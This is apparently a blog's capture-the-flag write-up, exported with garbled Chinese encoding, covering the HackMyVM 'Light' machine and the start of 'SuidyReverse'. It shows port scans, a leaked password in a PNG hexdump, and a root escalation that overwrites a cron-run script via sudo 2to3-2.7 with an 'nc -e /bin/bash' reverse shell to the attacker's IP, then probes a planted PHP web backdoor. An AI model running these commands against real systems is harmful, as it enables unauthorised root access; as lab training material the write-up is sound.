<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Light
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šæ‰¹é‡tcpè¿æ¥ã€SUIDæ›¿æ¢
<br><br>nmap  192.168.56.10 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 14:14 CST
Nmap scan report for 192.168.56.10
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
48383/tcp open  unknown
MAC Address: 08:00:27:C2:2E:36 (Oracle VirtualBox virtual NIC)
<br>å‘ç°ç«¯å£ä¸€ç›´åœ¨å˜<br>å†æ¬¡ç”¨nmapæ‰«æä¸€ä¸‹ï¼Œ<br>nmap -sC -sV -p- 192.168.56.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 14:46 CST
Nmap scan report for 192.168.56.10
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|\_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
59355/tcp open  unknown
| fingerprint-strings:
|   GenericLines, NULL:
|     00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR
|     00000010: 0000 013f 0000 0085 0806 0000 002d 80ff ...?.........-..
|     00000020: 0c00 0000 0173 5247 4200 aece 1ce9 0000 .....sRGB.......
|     00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000 ..gAMA......a...
|     00000040: 0009 7048 5973 0000 0ec3 0000 0ec3 01c7 ..pHYs..........
|     00000050: 6fa8 6400 0007 de49 4441 5478 5eed dbf7 o.d....IDATx^...
|     00000060: 9314 4518 c671 ffff 1f2d ab2c 73c0 9cb0 ..E..q...-.,s...
|     00000070: 0c08 7292 0491 2092 8380 08e2 09ca c1a1 ..r... .........
|     00000080: 2248 7aed c799 2ea7 a67a 6f7b c3ed edf2 "Hz......zo{....
|     00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400 |?US.}...a....T.
|     000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f .!...%...%...%..
|     000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..
|     000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..
|\_    000000d0: 8025 c
<br>å¯ä»¥å‘ç°æ‰«æå‡º59355ç«¯å£è¿”å›äº†ä¸€ä¸ªå›¾ç‰‡çš„Hexdump<br>ä½†æ˜¯è¿™ä¸ªæ˜¯ä¸å®Œæ•´çš„<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨nc.traditional æ‰¹é‡è¿æ¥ç«¯å£ è¿™æ ·æˆ‘ä»¬å°±èƒ½è·å–åˆ°å®Œæ•´çš„è¿”å›æ•°æ®äº†<br>nc.traditional -nv 192.168.56.10 10000-60000
(UNKNOWN) [192.168.56.10] 21478 (?) open
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 013f 0000 0085 0806 0000 002d 80ff  ...?.........-..
00000020: 0c00 0000 0173 5247 4200 aece 1ce9 0000  .....sRGB.......
00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
00000040: 0009 7048 5973 0000 0ec3 0000 0ec3 01c7  ..pHYs..........
00000050: 6fa8 6400 0007 de49 4441 5478 5eed dbf7  o.d....IDATx^...
00000060: 9314 4518 c671 ffff 1f2d ab2c 73c0 9cb0  ..E..q...-.,s...
00000070: 0c08 7292 0491 2092 8380 08e2 09ca c1a1  ..r... .........
00000080: 2248 7aed c799 2ea7 a67a 6f7b c3ed edf2  "Hz......zo{....
00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400  |?US.}...a....T.
000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f  .!...%...%...%..
000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000d0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000e0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000f0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000100: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000110: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000120: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000130: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000140: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000150: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000160: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000170: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000180: 8025 c20f 8025 c20f 80a5 c50c bf07 0f23  .%...%.........#
00000190: eede 8fb8 d76e fa59 654f 82dc b7bf ff69  .....n.YeO.....i
000001a0: 0b30 538f 1fa7 f14f 63af 4d3f 976c d41c  .0S....Oc.M?.l..
000001b0: cda2 5da3 f5b7 98e1 77e4 c788 67b7 45bc  ..].....w...g.E.
000001c0: f855 c49b 5f47 bcba 33e2 f8e5 f697 0b4e  .U..\_G..3......N
000001d0: fd50 7f5e 586a 0b30 5337 ff8a 7869 47b3  .P.^Xj.0S7..xiG.
000001e0: e9e7 928d 9aa3 59b4 6bb4 fe16 ffb6 f78d  ......Y.k.......
000001f0: 3d11 efec 8b38 73b5 2d58 703f 2c47 bcbd  =....8s.-Xp?,G..
00000200: 37bd f952 b063 f6ee dc8b 782b 9d50 b5e9  7..R.c....x+.P..
00000210: e712 ad35 adb9 4d69 edcd d22c dad5 fadb  ...5..Mi...,....
00000220: 88be 6d80 c50f 3f4d d25a e1a7 4bf8 5da7  ..m...?M.Z..K.].
00000230: 2276 9ffe 7f3b d6bb 4abc f27b c49e 54be  "v...;..J..{..T.
00000240: e364 5b90 94ca 64dc fd5d 5d29 efaf 4b67  .d[...d..]])..Kg
00000250: dd2d 4722 bef8 3ee2 da6a 5b98 cce2 f826  .-G"..&gt;..j[....&amp;
00000260: d99f fc79 3762 e9f8 daf5 721b fbce ae5d  ...y7b....r....]
00000270: 4f4a ed6a fbf2 585b a155 7b7c 35f5 2ea7  OJ.j..X[.U{|5...
00000280: e3d3 fedf dfdf 6c1a 0b1d afea 76db cd21  ......l.....v..!
00000290: f4de 3711 7b3b 7d19 b75d a9e9 ef28 edd6  ..7.{;}..]...(..
000002a0: cc87 74db fdfa 4cb3 f63e 487d ef87 5f4d  ..t...L..&gt;H}..\_M
000002b0: 3f06 ada1 bfd2 4944 afd5 a69f e7c4 931d  ?.....ID........
000002c0: 7eab 779a 4079 6d57 73ab 7cf8 62c4 b6a3  ~.w.@ymWs.|.b...
000002d0: 119f 1c8e b874 bdad 949c baf2 ffed 7356  .....t........sV
000002e0: 2a1b 777f cbb7 9a45 a1b2 97d3 edd4 205f  \*.w....E...... \_
000002f0: a6c5 aa2b 8ea5 136d 416b bd8f 4f6a f7b7  ...+...mAk..Oj..
00000300: 35bd 393e 3e14 71f1 5a5b a9a5 aba4 6fce  5.9&gt;&gt;.q.Z[....o.
00000310: 451c bc30 bc5d f571 ade3 ebb7 ab7d e64d  E..0.].q.....}.M
00000320: 6ffa acb6 bfb5 f596 6f36 f3a4 70d1 a690  o.......o6..p...
00000330: 3e54 6837 87d0 bba9 ce34 daad ed6f 6dbb  &gt;Th7.....4...om.
00000340: 5233 1fa5 e353 602a f8bb e157 db8f fe1a  R3...S\*...W....
00000350: ba72 a379 eded bf23 5edf dd6c b706 3c4a  .r.y...#^..l..&lt;J
00000360: d800 4f76 f89d 4c93 a1db e2ee 44fe f04b  ..Ov..L.....D..K
00000370: 7b5b d909 a1bc a8ba f54a 65a3 ee4f 0b41  {[.......Je..O.A
00000380: be4a 67c2 8f0f 467c f65d 7356 2d79 f828  .Jg...F|.]sV-y.(
00000390: 627b 5a78 1f7e 9bce c09d 052f eb75 7ce3  b{Zx.~...../.u|.
000003a0: ec4f a1b7 f940 1360 6ba9 6db7 54af d46e  .O...@.k.m.T..n
000003b0: 496d 7f6b eb89 ae4c f26d efa0 ab94 49fa  Im.k...L.m....I.
000003c0: 3149 7f6b db2d 19e5 f86a d641 697f fde3  1I.k.-...j.Ai...
000003d0: fb34 adf7 9329 34bb 8f12 1486 73e2 c90e  .4...)4.....s...
000003e0: bfd2 6299 76d9 f95f 07d7 fbe8 40c4 335b  ..b.v..\_....@.3[
000003f0: 23fe 4867 be61 f480 f9ad b498 ce2f b705  #.Hg.a......./..
00000400: 1dd3 3ee6 49ca 6aad 352e c3ca 8eff d45c  ..&gt;.I.j.5......\
00000410: 650c 6bb7 f4da da76 4bf5 446f ce61 6fd4  e.k....vK.Do.ao.
00000420: da7e d4b6 3b49 7f4b 6525 93cc c7b8 655f  .~..;I.Ke%....e\_
00000430: a4ab c333 3f13 7eeb 4603 ad01 d7c0 f74d  ...3?.~.F......M
00000440: 7322 2597 e9ea 4c13 996f e114 5add 0f28  s"%...L..o..Z..(
00000450: 723d 9d2d 6ba9 1d6d 27d2 99b2 6f1a c73c  r=.-k..m'...o..&lt;
00000460: adb2 4174 95a4 f1c8 9b6e cd34 4ee3 b6a1  ..At.....n.4N...
00000470: 4f5a 5f49 b74f dd71 d615 7457 7e6d ed7c  OZ\_I.O.q..tW~m.|
00000480: 0cab 27eb 117e 35ed 8ed2 df9a f19b e67c  ..'..~5........|
00000490: 8c5b 46f8 ad33 0db4 065c 03df 573b 69f9  .[F..3...\..W;i.
000004a0: 5945 b7ec 5c7b 59af 0599 e5d7 aa7c e5cf  YE..\{Y......|..
000004b0: e619 d1af b79a edea 4a5b 2929 b531 8816  ........J[)).1..
000004c0: a91e 34ab 7d9d 9db5 50fa 6afb 318b b292  ..4.}...P.j.1...
000004d0: 9f6f a437 ea89 a69e c6e5 b7db 1107 cf37  .o.7...........7
000004e0: cfcd c66d 43df 37d3 986a 8cb5 bf03 697f  ...mC.7..j....i.
000004f0: ba92 de7d aaad 90e4 d7d6 cec7 b07a b21e  ...}.........z..
00000500: e157 d3ee 28fd 1dd6 eeb4 e7a3 b6ac ff3e  .W..(..........&gt;
00000510: fafc 48aa 97c2 efde 8366 3c79 e637 651a  ..H......f&lt;y.7e.
00000520: 684d 8226 a3ef 741a 782d bcd2 a469 22b2  hM.&amp;..t.x-...i".
00000530: 6b69 31ea e1f6 a654 a605 a84f fdf6 a640  ki1....T...O...@
00000540: da7c b079 e09d 95f6 5752 5a18 83e8 0da6  .|.y....WRZ.....
00000550: 7675 9538 e8f6 b8b6 1fd3 a8d7 2d2b d5d3  vu.8........-+..
00000560: e2bd 9042 fa6c 3a39 647a 2654 3a79 f4f7  ...B.l:9dz&amp;T:y..
00000570: 576a a376 acf2 c9a8 fb81 51ed 7cd4 d693  Wj.v......Q.|...
00000580: 5b69 3e34 177a b3ea 417d 496d 3f46 69b7  [i&gt;4.z..A}Im?Fi.
00000590: afd4 dfda 766b e763 9275 90eb 95de 471a  ....vk.c.u....G.
000005a0: bf5f 5288 1f4d b7f3 6753 bdd3 69d3 f1e8  .\_R..M..gS..i...
000005b0: c392 3bf3 f3e5 e9c5 0cbf ffbe 85de 0ea2  ..;.............
000005c0: 0655 97f4 ba5d d487 06dd 6fa6 eb3b 4b0a  .U...]....o..;K.
000005d0: b07c fba9 dfab 9ece 80ba 05e8 d2a4 e843  .|.............C
000005e0: 092d 7a4d b43e 98d8 77ae fd65 abbf bffc  .-zM.&gt;..w..e....
000005f0: d725 fab7 abb4 804a 1e3d 8eb8 beda f441  .%.....J.=.....A
00000600: 6daf 0e78 b3d5 f663 d27a 1ac7 ee31 97ea  m..x...c.z...1..
00000610: 1dbd d4fc 5f63 94d5 eeaf f6cd 9be7 37ff  ....\_c........7.
00000620: 054f 6d3f 06cd 476d 3dd1 1c68 2e34 27d7  .Om?..Gm=..h.4'.
00000630: d315 d3fd 74d5 a27a dd75 55db 8fda 766b  ....t..z.uU...vk
00000640: fb3b 6ebb a3cc ef28 f54a efa3 fc81 913e  .;n....(.J.....&gt;
00000650: f155 5f14 ba7a 5d77 7f73 6231 c34f 6790  .U\_..z]w.sb1.Og.
00000660: fc17 1e1a 586d 1a6c fdff e92d 6da5 9626  ....Xm.l...-m..&amp;
00000670: 43cf 57f4 3b6d fa74 4acf 2206 797e a9b9  C.W.;m.tJ.".y~..
00000680: d5d5 d9ae a4bf bfe7 b637 0ba3 4b0f b0b5  .........7..K...
00000690: 0fed 6b2d fafa 80ce 9c35 0ba3 dbae ae14  ..k-.....5......
000006a0: 153e 3b3a b744 596d 7ffb f534 7e1a c7fe  .&gt;;:.DYm...4~...
000006b0: 314f 737f a571 2995 75e7 77d4 764b f321  1Os..q).u.w.vK.!
000006c0: b5f5 321d 8fae ba72 fdee baaa ed87 d4b4  ..2....r........
000006d0: 5bdb df49 daad 9ddf 49d7 c14a ba33 503d  [..I....I..J.3P=
000006e0: 6d7f dc6d 6e85 4bc7 3707 16ff b677 91e9  m..mn.K.7....w..
000006f0: eca9 f0d3 4219 c5ce 147a ba32 292d 3e00  ....B....z.2)-&gt;.
00000700: 5508 bf8d a46f e1eb 01b7 9e33 d6d2 37eb  U....o.....3..7.
00000710: f525 d4fd e996 7c8e 1e1e 038b 86f0 9b77  .%....|........w
00000720: fae4 4e9f 025f b8d6 7c63 5eb7 10fa d6bf  ..N..\_..|c^.....
00000730: 9e15 0218 1be1 37ef f477 927a a8ac bfaa  ......7..w.z....
00000740: d0a6 af3f ccd1 2766 c0a2 22fc 0058 22fc  ...?..'f.."..X".
00000750: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000760: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000770: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000780: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000790: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007a0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007b0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007c0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007d0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007e0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007f0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000800: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000810: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000820: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000830: 0018 8af8 1765 703a 66dc e967 bc00 0000  .....ep:f..g....
00000840: 0049 454e 44ae 4260 82                   .IEND.B.
<br>ç„¶åå°†å…¶ä¿å­˜ä¸‹æ¥<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" referrerpolicy="no-referrer"><br>è·å–åˆ°äº†è´¦æˆ·å¯†ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.002.png" referrerpolicy="no-referrer"><br><br>iloveopenedports
<br>è¿æ¥ä¸Šå»ï¼Œå¯†ç æç¤ºæˆ‘ä»¬å¯ä»¥è·å–shadow<br>å¯èƒ½æ˜¯è¿›è¡Œçˆ†ç ´<br>ä½†æ˜¯shadowæ˜¯æ²¡æœ‰æƒé™è¯»å–çš„ï¼Œä¹Ÿå°±æ— æ³•çˆ†ç ´äº†<br>lover@light:~$ ls -la
total 52
drwxr-xr-x 3 lover lover 4096 Nov 18 01:51 .
drwxr-xr-x 3 root  root  4096 Nov 13  2020 ..
-rw-r--r-- 1 lover lover  220 Nov 13  2020 .bash\_logout
-rw-r--r-- 1 lover lover 3526 Nov 13  2020 .bashrc
-rwxr-xr-x 1 lover lover 1921 Nov 13  2020 flag.sh
drwxr-xr-x 3 lover lover 4096 Nov 13  2020 .local
-rw-r--r-- 1 lover lover 9037 Nov 13  2020 mypass.txt
-rw-r--r-- 1 lover lover  807 Nov 13  2020 .profile
-rwxr-xr-x 1 lover lover  660 Nov 13  2020 tip.py
-rw------- 1 lover lover   17 Nov 13  2020 user.txt
-rw------- 1 lover lover   51 Nov 18 01:51 .Xauthority
<br>tip.py<br> cat tip.py
#!/usr/bin/env python3
import socket
from random import randint

HOST = '0.0.0.0'                 # Symbolic name meaning all available interfaces
while True:
        allow\_reuse\_address = True
        random = randint(8000,65000)
        PORT = random              # Arbitrary non-privileged port
        s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
        s.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        conn, addr = s.accept()
        print ("Connected by",addr)
        with open('mypass.txt', 'r') as f:
                conn.sendall(f.read().encode('utf-8'))
        conn.close()
<br>mypassword.txtå°±æ˜¯å›¾ç‰‡çš„hexdump<br>ææƒæ£€æµ‹<br>sudo -l
Matching Defaults entries for lover on light:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lover may run the following commands on light:
    (ALL : ALL) NOPASSWD: /usr/bin/2to3-2.7
<br>çœ‹ä¸‹å‘½ä»¤çš„å‚æ•°<br>2to3-2.7 --help
Usage: 2to3 [options] file|dir ...

Options:
  -h, --help            show this help message and exit
  -d, --doctests\_only   Fix up doctests only
  -f FIX, --fix=FIX     Each FIX specifies a transformation; default: all
  -j PROCESSES, --processes=PROCESSES
                        Run 2to3 concurrently
  -x NOFIX, --nofix=NOFIX
                        Prevent a transformation from being run
  -l, --list-fixes      List available transformations
  -p, --print-function  Modify the grammar so that print() is a function
  -v, --verbose         More verbose logging
  --no-diffs            Don't show diffs of the refactoring
  -w, --write           Write back modified files
  -n, --nobackups       Don't write backups for modified files
  -o OUTPUT\_DIR, --output-dir=OUTPUT\_DIR
                        Put output files in this directory instead of
                        overwriting the input files.  Requires -n.
  -W, --write-unchanged-files
                        Also write files even if no changes were required
                        (useful with --output-dir); implies -w.
  --add-suffix=ADD\_SUFFIX
                        Append this string to all output filenames. Requires
                        -n if non-empty.  ex: --add-suffix='3' will generate
                        .py3 files.
<br>è¿™é‡Œä»–ä¼šä¸æ–­æ‰§è¡Œè¿™ä¸ªpyè„šæœ¬ï¼Œè‚¯å®šæ˜¯æœ‰ä¸€ä¸ªä¸ªè¿›ç¨‹åœ¨æ“ä½œçš„<br>æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªpspy64ç›‘å¬è¿›ç¨‹ã€‚æ‰¾å‡ºè¿™ä¸ªè¿›ç¨‹<br>è¿™é‡Œè€å¿ƒç­‰å¾…ä¸€ä¸‹<br>./pspy64 |grep UID=0
2024/11/18 02:12:01 CMD: UID=0    PID=8489   | /usr/sbin/CRON -f
2024/11/18 02:12:01 CMD: UID=0    PID=8490   | /usr/sbin/CRON -f
2024/11/18 02:12:01 CMD: UID=0    PID=8491   | /bin/sh -c python /root/script/light.py
<br>å¯ä»¥çœ‹åˆ°ä»–å®šæ—¶ä¼šæ‰§è¡Œè¿™ä¸ªlight.pyè„šæœ¬<br>æˆ‘ä»¬åˆ©ç”¨2to3-2.7å‘½ä»¤æ›¿æ¢è¿™ä¸ªè„šæœ¬<br>åå¼¹shell<br>æ–°å»ºä¸€ä¸ªè„šæœ¬light.py<br>import os
os.system('nc -e /bin/bash 192.168.56.6 1122')
<br>åˆ©ç”¨-Wå‚æ•° ä¸-oå‚æ•°å®ç°æ›¿æ¢<br>sudo 2to3-2.7 -Wn light.py -o /root/script/
<br>å¼€å¯ç›‘å¬ è¿”å›rootshell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.003.png" referrerpolicy="no-referrer"><br>sh flag.sh

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,
-------------------------

PWNED HOST: light

PWNED DATE: Mon 18 Nov 2024 02:22:04 AM EST

WHOAMI: uid=0(root) gid=0(root) groups=0(root)

FLAG: ilovepython
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/18.light.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/18.Light.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[17.SuidyReverse]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç›®å½•æ‰«æ" data-href="#2.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç›®å½•æ‰«æ</a>


<br><a data-tooltip-position="top" aria-label="3. RFLåˆ©ç”¨åå¼¹shell" data-href="#3. RFLåˆ©ç”¨åå¼¹shell" href="https://www.c1trus.top/about:blank#3._RFLåˆ©ç”¨åå¼¹shell" class="internal-link" target="_self" rel="noopener nofollow">3. RFLåˆ©ç”¨åå¼¹shell</a>

<br><a data-tooltip-position="top" aria-label="3.1. åˆ©ç”¨dataä¼ªåè®®è¯•è¯•" data-href="#3.1. åˆ©ç”¨dataä¼ªåè®®è¯•è¯•" href="https://www.c1trus.top/about:blank#3.1._åˆ©ç”¨dataä¼ªåè®®è¯•è¯•" class="internal-link" target="_self" rel="noopener nofollow">3.1. åˆ©ç”¨dataä¼ªåè®®è¯•è¯•</a>


<br><a data-tooltip-position="top" aria-label="4. ææƒmurda" data-href="#4. ææƒmurda" href="https://www.c1trus.top/about:blank#4._ææƒmurda" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒmurda</a>
<br><a data-tooltip-position="top" aria-label="5. ææƒtheuser" data-href="#5. ææƒtheuser" href="https://www.c1trus.top/about:blank#5._ææƒtheuser" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒtheuser</a>
<br><a data-tooltip-position="top" aria-label="6. ææƒroot" data-href="#6. ææƒroot" href="https://www.c1trus.top/about:blank#6._ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒroot</a>
<br><a data-tooltip-position="top" aria-label="7. æ‹“å±•" data-href="#7. æ‹“å±•" href="https://www.c1trus.top/about:blank#7._æ‹“å±•" class="internal-link" target="_self" rel="noopener nofollow">7. æ‹“å±•</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=SuidyRevenge
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šRFI ã€dataä¼ªåè®® ã€SUIDæ–‡ä»¶æ›¿æ¢ã€mvä¸cp
<br><br>nmap -sV -sS 192.168.56.9 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 19:55 CST
Nmap scan report for 192.168.56.9
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    nginx 1.14.2
MAC Address: 08:00:27:C3:F8:55 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
<br><br>ä¸»é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" referrerpolicy="no-referrer"><br>Im proud to announce that "theuser" is not anymore in our servers. Our admin "mudra" is the best admin of the world. -suidy  &lt;!--  "mudra" is not the best admin, IM IN!!!! He only changed my password to a different but I had time to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!  -theuser  --&gt; 
<br>æˆ‘å¾ˆè‡ªè±ªåœ°å®£å¸ƒï¼Œâ€œtheuserâ€ä¸å†åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šäº†ã€‚æˆ‘ä»¬çš„ç®¡ç†å‘˜â€œmudraâ€æ˜¯ä¸–ç•Œä¸Šæœ€æ£’çš„ç®¡ç†å‘˜ã€‚ -suidy
&lt;!--  â€œmudraâ€å¹¶ä¸æ˜¯æœ€æ£’çš„ç®¡ç†å‘˜ï¼Œæ˜¯æˆ‘åœ¨ï¼ä»–åªæ˜¯æŠŠæˆ‘çš„å¯†ç æ”¹äº†ï¼Œä½†æˆ‘æœ‰æ—¶é—´æŠŠä¸¤ä¸ªåé—¨ï¼ˆ.phpæ–‡ä»¶ï¼‰ä»æˆ‘çš„KALIæ”¾åˆ°/supersecureç›®å½•é‡Œï¼Œä»¥ä¿æŒè®¿é—®ï¼  -theuser  --&gt;
<br>è·å–åˆ°å‡ ä¸ªç”¨æˆ·å<br>theuser
suidy
mudra
<br>ä¸€ä¸ªè·¯å¾„<br>/supersecure
<br>å¯¹è·¯å¾„è¿›è¡Œæ‰«æ<br>dirsearch -u http://192.168.56.9/supersecure
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/suidyreverse/reports/http\_192.168.56.9/\_supersecure\_24-11-17\_20-01-43.txt

Target: http://192.168.56.9/

[20:01:43] Starting: supersecure/
[20:02:02] 200 -   28B  - /supersecure/simple-backdoor.php

Task Completed
<br>è®¿é—®ç½‘ç«™åé—¨<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.002.png" referrerpolicy="no-referrer"><br>åˆ©ç”¨cmdå‚æ•°åå¼¹shell<br>æ²¡å¼¹æˆåŠŸ<br>lsçœ‹ä¸‹æœ‰ä»€ä¹ˆä¸œè¥¿<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.003.png" referrerpolicy="no-referrer"><br>mysuperbackdoor.php
simple-backdoor.php
